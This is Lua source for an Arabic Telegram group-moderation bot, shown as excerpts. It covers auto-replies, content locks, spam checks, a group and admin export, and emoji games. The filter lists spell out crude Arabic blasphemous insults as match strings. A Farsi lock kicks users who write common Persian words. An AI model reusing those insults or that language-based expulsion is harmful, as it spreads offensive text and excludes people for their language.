DevRio:set(Latvia.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevRio:del(Latvia.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Latvia..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(Latvia..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(Latvia.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(Latvia.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Latvia.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Latvia.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(Latvia.."Rio:Text:AllRed"..msg.content_.text_) then
function LatviaTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Latvia..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Latvia.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevRio:sismember(Latvia..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(Latvia..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source Latvia     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Latvia then
floods = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(Latvia.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevRio:setex(Latvia.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Latvia     --
...
DevRio:set(Latvia..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(Latvia..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(Latvia..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(Latvia..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(Latvia..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevRio:get(Latvia..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Latvia..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Latvia..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Latvia..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Latvia..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Latvia..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Latvia..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Latvia..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevRio:get(Latvia..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Latvia..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevRio:get(Latvia..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Latvia     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevRio:get(Latvia..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Latvia..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(Latvia..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
...
if DevRio:get(Latvia.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Latvia     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(Latvia..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Latvia,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Latvia) then 
if DevRio:sismember(Latvia..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevRio:get(Latvia.."Rio:Text:BotWelcome") then RioText = DevRio:get(Latvia.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevRio:get(Latvia.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(Latvia.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
if DevRio:get(Latvia..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Latvia     --
...
if DevRio:get(Latvia..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Latvia..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Latvia..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevRio:get(Latvia..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Latvia..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Latvia..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevRio:get(Latvia..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(Latvia..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(Latvia..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source Latvia     --
if DevRio:get(Latvia.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevRio:del(Latvia.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(Latvia.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevRio:get('LatviaTeam:'..Latvia.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('LatviaTeam:'..Latvia..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('LatviaTeam:'..Latvia.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('LatviaTeam:'..Latvia.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('LatviaTeam:'..Latvia..'id:user'..msg.chat_id_)  
DevRio:incrby(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevRio:del('LatviaTeam:'..Latvia..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('LatviaTeam:'..Latvia.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('LatviaTeam:'..Latvia..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('LatviaTeam:'..Latvia.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('LatviaTeam:'..Latvia.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('LatviaTeam:'..Latvia..'ids:user'..msg.chat_id_)  
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevRio:get(Latvia.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevRio:get(Latvia.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevRio:get(Latvia.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevRio:get(Latvia.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevRio:get(Latvia.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevRio:smembers(Latvia..'Rio:Groups') 
local BotName = (DevRio:get(Latvia.."Rio:NameBot") or 'لاتفيا')
local GetJson = '{"BotId": '..Latvia..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevRio:get(Latvia.."Rio:Groups:Links"..v)
Welcomes = DevRio:get(Latvia..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevRio:smembers(Latvia..'Rio:RioConstructor:'..v)
Constructors = DevRio:smembers(Latvia..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(Latvia..'Rio:Constructor:'..v)
Managers = DevRio:smembers(Latvia..'Rio:Managers:'..v)
Admis = DevRio:smembers(Latvia..'Rio:Admins:'..v)
Vips = DevRio:smembers(Latvia..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
--     Source Latvia     --
if DevRio:get(Latvia.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevRio:get(Latvia.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Latvia.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevRio:get(Latvia..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevRio:del(Latvia..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(Latvia..'DevRio4'..msg.sender_user_id_)
...
DevRio:set(Latvia..'Rio:ChId',data.id_)
else
...
--     Source Latvia     --
if DevRio:get(Latvia.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevRio:del(Latvia.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevRio:del(Latvia.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(Latvia.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevRio:get(Latvia..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevRio:del(Latvia..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevRio:del(Latvia..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:NameBot', text)
return false 
end
--     Source Latvia     --
if text == "الرابط" then
if not DevRio:get(Latvia..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevRio:get(Latvia.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(Latvia.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source Latvia     --
if text == "الرابط" then
if not DevRio:get(Latvia.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
if DevRio:get(Latvia.."Rio:Groups:Links"..msg.chat_id_) then
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(Latvia.."Rio:Groups:Links"..msg.chat_id_)
...
DevRio2 = math.random(#LatviaTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevRio:get(Latvia..'Rio:NameBot') or 'لاتفيا') 
local LatviaTeam = {"اسمي القميل "..NameBot.." "} 
DevRio2 = math.random(#LatviaTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(Latvia..'Rio:NameBot') or 'لاتفيا') then 
NameBot = (DevRio:get(Latvia..'Rio:NameBot') or 'لاتفيا')
...
if tonumber((DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevRio:del(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevRio:del(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source Latvia     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevRio:get(Latvia..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1,LatviaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Latvia..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
LatviaTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,LatviaTeam, 1, 'md')
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Latvia..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
if not DevRio:get(Latvia..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(Latvia.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevRio:setex(Latvia.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevRio2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
if text == DevRio:get(Latvia..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Latvia..'Rio:GameNum5'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Latvia..'Rio:GameNum6'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Latvia..'Rio:GameNum7'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Latvia..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(Latvia..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Latvia..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(Latvia..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Latvia..'Rio:GameNum8'..msg.chat_id_)
...
--     Source Latvia     --
if DevRio:get(Latvia.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(Latvia.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
